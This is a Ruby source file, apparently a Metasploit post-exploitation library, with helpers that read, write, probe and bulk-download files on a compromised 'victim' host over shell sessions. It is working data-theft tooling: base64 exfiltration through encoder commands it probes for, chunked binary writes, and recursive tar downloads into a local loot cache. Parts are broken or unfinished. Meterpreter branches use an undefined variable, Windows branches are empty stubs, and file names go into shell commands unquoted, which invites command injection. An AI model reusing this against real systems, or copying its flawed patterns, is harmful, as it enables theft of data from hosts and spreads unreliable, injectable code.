# Advanced Post Exploitation
#

# include minitar
#require ::File.dirname(__FILE__) + '/../../../../' + 'external/archive-tar-minitar/lib/archive/tar/minitar'
#require 'archive/tar/minitar'
require 'minitar'
require 'core/post/staekka'


module Msf
  class Post
    # module Staekka
    module File
      include ::Archive::Tar
      include Msf::Post::Staekka

      #
      # Check for read permissions of +path+ on the remote file system
      #
      def readable?(path)
        if session.type == "meterpreter"
          stat = session.fs.file.stat(path) rescue nil
        # XXX
        elsif session.type.match "offline"
            session.readable?(path)
        else
          if session.platform =~ /win/
          # XXX
          else
            cmd_success?("test -r #{path}")
          end
        end
      end

      #
      # Check for write permissions of +path+ on the remote file system
      #
      def writeable?(path)
        if session.type == "meterpreter"
          stat = session.fs.file.stat(path) rescue nil
        # XXX
        elsif session.type.match "offline"
            session.writeable?(path)
        else
          if session.platform =~ /win/
          # XXX
          else
            cmd_success?("test -w #{path}")
          end
        end
      end

      #
      # Check if +file+ exists and is a normal file
      #
      def file?(file)
        if session.type == "meterpreter"
          stat = session.fs.file.stat(path) rescue nil
        # XXX
        elsif session.type.match "offline"
            session.file?(file)
        else
          if session.platform =~ /win/
          # XXX
          else
            cmd_success?("test -f #{file}")
          end
        end
      end

      #
      # Check if +file+ exists
      #
      def exists?(file)
        if session.type == "meterpreter"
          stat = session.fs.file.stat(path) rescue nil
        # XXX
        elsif session.type.match "offline"
            session.exists?(file)
        else
          if session.platform =~ /win/
          # XXX
          else
            cmd_success?("test -e #{file}")
          end
        end
      end

      #
      # Check if +file+ exists and is a directory
      #
      def directory?(file)
        if session.type == "meterpreter"
          stat = session.fs.file.stat(path) rescue nil
        # XXX
        elsif session.type.match "offline"
            session.directory?(file)
        else
          if session.platform =~ /win/
          # XXX
          else
            cmd_success?("test -d #{file}")
          end
        end
      end

      #
      # Check if +file+ exists and its set-user-ID bit is set
      #
      def suid?(file)
        if session.type == "meterpreter"
          stat = session.fs.file.stat(path) rescue nil
        # XXX
        elsif session.type.match "offline"
          session.suid?(file)
        else
          if session.platform =~ /win/
          # XXX
          else
            cmd_success?("test -u #{file}")
          end
        end
      end

      #
      # Check if +file+ exists and has a size greater than zero
      # (directories are never empty)
      #
      def empty?(file)
        if session.type == "meterpreter"
          stat = session.fs.file.stat(path) rescue nil
        # XXX
        elsif session.type.match "offline"
          session.empty?(file)
        else
          if session.platform =~ /win/
          # XXX
          else
            cmd_success?("test ! -s #{file}")
          end
        end
      end
      #
      # Check if +file+ exists and is a symlink
      #
      def symlink?(file)
        if session.type == "meterpreter"
          stat = session.fs.file.stat(path) rescue nil
        # XXX
        elsif session.type.match "offline"
          session.symlink?(file)
        else
          if session.platform =~ /win/
          # XXX
          else
            cmd_success?("test -h #{file}")
          end
        end
      end

      #
      # Platform-agnostic file read.  Returns contents of remote file +file_name+
      # as a String.
      #
      def read_file(file_name, binary = true, cached = true, timeout = nil)
        return nil if file_name.nil?
        return nil if file_name.empty?
        data = nil
        if session.type.match "offline"
          data = session.read_file(file_name)
          return data
        end
        if cached == true
          if file_in_cache?(file_name)
            #vprint_debug("read (#{file_name}) from cache")
            data = file_from_cache(file_name)
            return data
          end
        end
        if session.type == "meterpreter"
          data = _read_file_meterpreter(file_name)
        elsif session.type == "shell"
          if session.platform =~ /win/
            data = session.shell_command_token("type \"#{file_name}\"")
          else
            if binary == false
              if timeout.nil?
                data = read_file_plaintext(file_name)
              else
                data = read_file_plaintext(file_name, timeout)
              end
            else
              if timeout.nil?
                data = read_file_binary(file_name)
              else
                data = read_file_binary(file_name, timeout)
              end
            end
          end
        elsif session.type.match "offline"
          data = session.read_file(file_name)
          return data
        end
        if cached == true
          file_to_cache(file_name, data)
        end
        data
      end

      #
      # adds file content to the cache
      #
      def file_to_cache(file_name, data)
        return nil if data.nil? or data.empty?
        path = file_cache_path(file_name)
        FileUtils.mkdir_p(::File.dirname(path))
        ::File.open(path, "wb") do |fd|
          fd.write(data)
        end
      end

      #
      # returns the full path of the local used cache
      #
      def file_cache_path(file_name)
        path = Msf::Config.loot_directory
        path << '/'
        ws = (db ? myworkspace.name[0, 16] : 'default').to_s
        path << ws + '/'
        host = framework.db.normalize_host(host)
        path << "#{host}/"
        path << 'filesystem/'
        path << file_name.to_s
        ::File.expand_path(path)
      end

      #
      # reads a file from the cache
      #
      def file_from_cache(file_name)
        path = file_cache_path(file_name)
        ::File.read(path)
      end

      #
      # checks is a file(name) had already been cached
      #
      def file_in_cache?(file_name)
        path = file_cache_path(file_name)
        ::File.exist?(path)
      end

      #
      # delete a file from cache
      #
      def delete_from_cache(file_name)
        if file_in_cache?(file_name)
          path = file_cache_path(file_name)
          ::File.delete(path)
        end
      end

      #
      # read a normal text file (using cat)
      #
      def read_file_plaintext(file_name, timeout = 10)
        # return nil if file_name.empty?
        # file_name = file_name.shellescape
        # data = session.shell_command_token("cat \'#{file_name}\'", timeout)
        data = session.shell_command_token("cat \'#{file_name}\' 2>/dev/null", timeout)
        data
      end

      #
      # Returns a MD5 checksum of a given remote file
      #
      def file_remote_digestmd5(file2md5)
        data = read_file(file2md5, true, false)
        chksum = nil
        if data
          chksum = Digest::MD5.hexdigest(data)
        end
        chksum
      end

      #
      # reading a binary file by doing a base64 encoding of the content on the
      # remote system and decode it here
      #
      def read_file_binary(file_name, timeout = nil)
        if timeout.nil?
          timeout = 60 * 5 # default 5 minutes for big files
        end

        command = find_base64_command
        if command.nil?
          fail RuntimeError, "Can't find command on the victim for reading binary data / decoding base64", caller
        end
        cmd = command.gsub("__READ_FILE__", file_name)
        # XXX
        out = session.shell_command_token("#{cmd}", 30, timeout) # high timeout for big files
        ###########
        #tmp1 = ::File.new("/tmp/__base64_1", "w")
        #tmp1.print out
        #tmp1.close
        ###########
        return nil if out.nil?
        return nil if out.empty?
        # remove output from uuencode
        out.gsub!('begin-base64 644 -', "")
        out.gsub!("====", "")
        Rex::Text.decode_base64(out)
      end

      #
      # search a working command for doing the base64 encoding
      #
      def find_base64_command
        # check if command is already known if cache exists
        if  session.methods.include? :cache
          if session.cache.exists?("base64_command")
            vprint_status("base64 command already known: #{session.cache.read('base64_command')}")
            command = session.cache.read("base64_command")
            return command
          end
        end
        my_command = nil
        tmp_file = "/tmp/" + ::Rex::Text.rand_text_alpha(12)
        token =  ::Rex::Text.rand_text_alpha(32)
        session.shell_command_token("echo #{token} > #{tmp_file}")
        [
          %q(echo Test __READ_FILE__), # XXX testing
          # %q^uuenview -b __READ_FILE__ 2>/dev/null^, # best performance
          %q(cat __READ_FILE__ 2>/dev/null|base64),
          %q(cat __READ_FILE__ 2>/dev/null|openssl enc -a -e),
          %q^perl -MMIME::Base64 -0777 -ne 'print encode_base64($_)' 2>/dev/null <__READ_FILE__^,
          %q^php  -r 'print  base64_encode(file_get_contents("__READ_FILE__"));'2>/dev/null ^,
          %q^python -c 'import base64;encoded=base64.b64encode(open("__READ_FILE__", "r").read());print encoded' 2>/dev/null^,
          %q^ruby -e 'require "base64";puts Base64.encode64(File.read("__READ_FILE__"))' 2>/dev/null^,
          # %q^cat __READ_FILE__ 2>/dev/null |uuencode -m - ^,
        ].each do | c |
          cmd = c.gsub("__READ_FILE__", tmp_file)
          out = session.shell_command_token("#{cmd}")
          next if out.nil?
          # remove output from uuencode
          out.gsub!('begin-base64 644 -', "")
          out.gsub!("====", "")

          decoded_out = Rex::Text.decode_base64(out)

          if decoded_out.match(token)
            vprint_status("found a tool for base64 encoding: #{c}")
            my_command = c
            if  session.methods.include? :cache
              session.cache.add("base64_command", my_command)
            end
            break
          end
        end
        # remove the tmp file
        file_rm(tmp_file)
        my_command
      end

      #
      # Read a local file +local+ and write it as +remote+ on the remote file
      # system
      #
      # def upload_file(remote, local)
      def upload_file(local, remote)
        write_file(remote, ::File.read(local))
      end

      #
      # Write +data+ to the remote file +file_name+.
      #
      # Truncates if +append+ is false, appends otherwise.
      #
      # You should never call this method directly.  Instead, call #write_file or
      # #append_file which will call this if it is appropriate for the given
      # session.
      #
      def _write_file_unix_shell(file_name, data, append = false)
        redirect = (append ? ">>" : ">")

        data = data.to_s
        # Short-circuit an empty string. The : builtin is part of posix
        # standard and should theoretically exist everywhere.
        if data.length == 0
          session.shell_command_token(": #{redirect} #{file_name}")
          return
        end

        d = data.dup
        d.force_encoding("binary") if d.respond_to? :force_encoding

        chunks = []
        command = nil
        encoding = :hex
        cmd_name = ""

        line_max = _unix_max_line_length
        vprint_status("Maximal line length: #{line_max}")
        # Leave plenty of room for the filename we're writing to and the
        # command to echo it out
        line_max -= file_name.length
        line_max -= 64
        # additional room
        # if it is not enough space the shell stops working!
        #                    if line_max > 65000
        #                        puts "extra buffer"
        #                        line_max -= 2048
        #                    end

        if  session.methods.include? :cache
          if session.cache.exists?("echo_cmd")
            vprint_status("already found a command for echo: #{session.cache.read('echo_cmd')}")
            command = session.cache.read("echo_cmd")
            encoding = session.cache.read("echo_enc")
            cmd_name = session.cache.read("echo_name")
          end
        end
        if command.nil?
          foo = find_echo_commnad
          if foo.empty?
            fail RuntimeError, "Can't find command on the victim for writing binary data", caller
          end
          command = foo[:cmd]
          encoding = foo[:enc]
          cmd_name = foo[:name]
        end
        # each byte will balloon up to 4 when we encode
        # (A becomes \x41 or \101)
        max = line_max / 4

        i = 0
        while i < d.length
          slice = d.slice(i...(i + max))
          case encoding
          when :hex
            chunks << Rex::Text.to_hex(slice)
          when :octal
            chunks << Rex::Text.to_octal(slice)
          when :bare_hex
            chunks << Rex::Text.to_hex(slice, '')
          end
          i += max
        end

        vprint_status("Writing #{d.length} bytes in #{chunks.length} chunks of #{chunks.first.length} bytes (#{encoding}-encoded), using #{cmd_name}")

        # The first command needs to use the provided redirection for either
        # appending or truncating.
        cmd = command.sub("CONTENTS") { chunks.shift }
        session.shell_command_token("#{cmd} #{redirect} '#{file_name}'")

        # After creating/truncating or appending with the first command, we
        # need to append from here on out.
        chunks.each { |chunk|
          vprint_status("Next chunk is #{chunk.length} bytes")
          cmd = command.sub("CONTENTS") { chunk }
          # session.shell_command_token("#{cmd} >> '#{file_name}'")
          # shorter timeout
          session.shell_command_token("#{cmd} >> '#{file_name}'", 5)
          # sleep 0.1
        }

        true
      end

      #
      # find a working command which can print binary files
      #
      def find_echo_commnad
        command = nil
        encoding = nil
        cmd_name = nil
        # Ordered by descending likeliness to work
        [
          # POSIX standard requires %b which expands octal (but not hex)
          # escapes in the argument. However, some versions (notably
          # FreeBSD) truncate input on nulls, so "printf %b '\0\101'"
          # produces a 0-length string. Some also allow octal escapes
          # without a format string, and do not truncate, so start with
          # that and try %b if it doesn't work. The standalone version seems
          # to be more likely to work than the buitin version, so try it
          # first.
          #
          # xxd's -p flag specifies a postscript-style hexdump of unadorned hex
          # digits, e.g. ABCD would be 41424344
          # bare_hex is the fastest version
          { cmd: %q(echo 'CONTENTS'|xxd -p -r), enc: :bare_hex, name: "xxd" },
          # Both of these work for sure on Linux and FreeBSD
          { cmd: %q(/usr/bin/printf 'CONTENTS'), enc: :octal, name: "printf" },
          { cmd: %q(printf 'CONTENTS'), enc: :octal, name: "printf" },
          # Works on Solaris
          { cmd: %q(/usr/bin/printf %b 'CONTENTS'), enc: :octal, name: "printf" },
          { cmd: %q(printf %b 'CONTENTS'), enc: :octal, name: "printf" },
          # Perl supports both octal and hex escapes, but octal is usually
          # shorter (e.g. 0 becomes \0 instead of \x00)
          { cmd: %q^perl -e 'print("CONTENTS")'^, enc: :octal, name: "perl" },
          # POSIX awk doesn't have \xNN escapes, use gawk to ensure we're
          # getting the GNU version.
          { cmd: %q(gawk 'BEGIN {ORS="";print "CONTENTS"}' </dev/null), enc: :hex, name: "awk" },
          # Use echo as a last resort since it frequently doesn't support -e
          # or -n.  bash and zsh's echo builtins are apparently the only ones
          # that support both.  Most others treat all options as just more
          # arguments to print. In particular, the standalone /bin/echo or
          # /usr/bin/echo appear never to have -e so don't bother trying
          # them.
          { cmd: %q(echo -ne 'CONTENTS'), enc: :hex },
          #######################
          #
          { cmd: %q^php -r 'print("CONTENTS");'^, enc: :octal, name: "php" },
          # TODO python remove last new line from output
          # Python supports both octal and hex escapes, but octal is usually
          # shorter (e.g. 0 becomes \0 instead of \x00)
          # { :cmd => %q^python -c 'print("CONTENTS")'^ , :enc => :octal, :name => "python" },
          # Ruby supports both octal and hex escapes, but octal is usually
          # shorter (e.g. 0 becomes \0 instead of \x00)
          { cmd: %q^ruby -e 'print("CONTENTS")'^, enc: :octal, name: "ruby" }
        ].each do |foo|
          # Some versions of printf mangle %.
          # test_str = "\0\xff\xfeABCD\x7f%%\nEF" # does not work with tty, because last \n is removed .chomp!
          test_str = "\0\xff\xfeABCD\x7f%%\nEF"
          # test_str = "\0\xff\xfe"
          case foo[:enc]
          when :hex
            cmd = foo[:cmd].sub("CONTENTS") { Rex::Text.to_hex(test_str) }
          when :octal
            cmd = foo[:cmd].sub("CONTENTS") { Rex::Text.to_octal(test_str) }
          when :bare_hex
            cmd = foo[:cmd].sub("CONTENTS") { Rex::Text.to_hex(test_str, '') }
          end
          a = session.shell_command_token("#{cmd}")
          vprint_status "Testing a command for echo: #{cmd}"
          #puts "DEBUG: string=[#{test_str.dump}]  a=[#{a.dump}] match=#{test_str == a} 2=#{test_str.dump == a.dump}"
          # if test_str == a # BUG: this often is NOT true! fix: .dump
          if test_str.dump == a.dump
            command = foo[:cmd]
            encoding = foo[:enc]
            cmd_name = foo[:name]
            if  session.methods.include? :cache
              session.cache.add("echo_cmd", command)
              session.cache.add("echo_enc", encoding)
              session.cache.add("echo_name", cmd_name)
            end
            vprint_status "Found a command for echo: #{cmd}"
            return { cmd: command, enc: encoding, name: cmd_name }
          else
            vprint_warning("#{cmd} Failed: #{a.inspect} != #{test_str.inspect}")
          end
        end
      end

      def set_unix_max_line_length(len)
        @shell_max_line_length = len
      end
      #
      # Calculate the maximum line length for a unix shell.
      #
      def _unix_max_line_length
        return @shell_max_line_length if @shell_max_line_length
        # Based on autoconf's arg_max calculator, see
        # http://www.in-ulm.de/~mascheck/various/argmax/autoconf_check.html
        calc_line_max = 'i=0 max= new= str=abcd; \
                      while (test "X"`echo "X$str" 2>/dev/null` = "XX$str") >/dev/null 2>&1 && \
                                      new=`expr "X$str" : ".*" 2>&1` && \
                                      test "$i" != 17 && \
                                      max=$new; do \
                              i=`expr $i + 1`; str=$str$str;\
                      done; echo $max'
        line_max = session.shell_command_token(calc_line_max).to_i

        # Fline_maxall back to a conservative 4k which should work on even the most
        # restrictive of embedded shells.
        line_max = (line_max == 0 ? 4096 : line_max)
        #######################################
        # maximal stable length seems to be 12288
        # TODO: more testing
        #                    stable_max = 12288
        stable_max = 4096
        if line_max > stable_max
          line_max = stable_max
        end
        #                    if line_max > 60000
        #                        puts "adding security buffer"
        #                        # adding a buffer
        #                        # otherwise it cases sometimes errors
        #                        # TODO: finding a stable and fast number for this buffer
        #                        line_max = line_max / 50
        #                    end
        # line_max = 4000 # TESTING
        vprint_status("Max line length is #{line_max}")
        @shell_max_line_length = line_max
        line_max
      end

      ########################################################################

      #
      # get the size of a file
      #
      def filesize(file)
        return nil unless readable?(file)
        if session.type.match "offline"
          return session.filesize(file)
        end
        if file?(file)
          out = cmd_exec("ls -l \'#{file}\' 2>/dev/null")
          return nil if out.nil? or out.empty?
          tmp = out.split(" ")
          return nil if tmp.length < 5
          _size = tmp[4]
        elsif directory?(file)
          out = cmd_exec("du -bs \'#{file}\' 2>/dev/null", nil, 300) # long timeout for big directories
          return nil if out.nil? or out.empty?
          tmp = out.split(" ")
          return nil if tmp.length < 2
          _size = tmp[0]
        else
          return nil
        end
        size = _size.to_i
        return nil if size <= 0
        if _size.end_with?("K") or _size.end_with?("k")
          size = size * 1024
        elsif _size.end_with?("M") or _size.end_with?("m")
          size = size * 1024 * 1024
        elsif _size.end_with?("G") or _size.end_with?("g")
          size = size * 1024 * 1024	* 1024
        end
        size
      end

      #
      # can files/directories be downloaded using tar
      # (is tar installed?)
      #
      def download_tar?
        return @can_use_tar unless @can_use_tar.nil?
        if installed? 'tar'
          @can_use_tar = true
          true
        else
          @can_use_tar = false
          false
        end
      end

      #
      # download files/directories using tar
      # (for recursive downloads)
      #
      def download_tar(file_name, timeout = nil)
        if timeout.nil?
          timeout = 60
        end

        # tmp_file_local = '/tmp/' + ::Rex::Text.rand_text_alpha(8)
        # TODO: random filename
        tmp_file_remote = '/tmp/_tar_tmp_remote' + (::File.basename file_name)
        cmd_exec("tar cfv #{tmp_file_remote} #{file_name}", nil, timeout)
        read_file(tmp_file_remote, true, true, timeout)
        Minitar.unpack(file_cache_path(tmp_file_remote), file_cache_path(''))
        delete_from_cache tmp_file_remote
        rm tmp_file_remote
        "OK"
      end

      #
      # read a file and save it on the local system
      # read recursive in case file is a directory
      #
      # XXX TODO: testing of big downloads
      def download(file_name, binary = true, cached = true, timeout = nil)
        # puts "_download(#{file_name})"
        #    unless overwrite==false
        #      return true if file_from_cache(file_name)
        #    end
        vprint_status("downloading #{file_name}")
        # offline -> download is not needed
        if session.type.match "offline"
          read_file(file_name)
        end
        size = filesize(file_name)
        if size.nil? || size == 0
          vprint_warning "#{file_name}: not readable or empty"
          return nil
        elsif size > 1024 * 1024 * 1024 # 1G
          print_error "#{file_name}: file size (#{size}) more than 1 G: This would fail and crash the session! Cannot download"
          return nil
        elsif size > 1024 * 1024 * 100	# 100 MB
          print_warning "#{file_name}: file size (#{size}) more than 100Mb: This will need long time and lot of recourses"
        # XXX need more testing: it might work
        elsif size > 1024 * 1024 * 10		# 10 MB
          # 10 MB
          print_warning "#{file_name}: file size (#{size}) more than 10Mb: This will need a while"
        elsif size > 1024 * 1024				# 1MB
          print_warning "#{file_name}: file size (#{size}) more than 1Mb: This might need some time"
        else														# less
          # OK
        end

        # XXX better timeout settings?
        if timeout.nil?
          timeout = (size / (1024 * 16)) + 15
        end

        # XXX:
        # TODO remove avoid usage of ring buffer
        if session.ring.size < size
          session.ring.size = size + 1024
        end

        if file?(file_name)
          read_file(file_name, binary, cached, timeout)
        elsif directory?(file_name)
          if download_tar?
            download_tar(file_name, timeout)
          else
            files = ls(file_name)
            files.each do |file|
              new_file = file_name + '/' + file
              new_file.gsub!('//', '/')
              download(new_file, binary, cached, timeout)
            end
          end
        else
          vprint_warning "Not a file or directory (#{file_name.dump}): Ignored"
          nil
        end
      end

      ########################################################################
    end
    end
  #	end
end

# module Msf::Post::File
#	include Msf::Post::Staekka::File
#
##	def  read_file(file_name, binary=true, cached=true, timeout=nil)
##		Staekka::File.read_file(file_name, binary, cached, timeout)
##	end
#
## unless session.staekka == nil
##		def readable?(path)
##			puts "---------------"
##			Msf::Post::Staekka::File.readable?(path)
##		end
##	end
# end
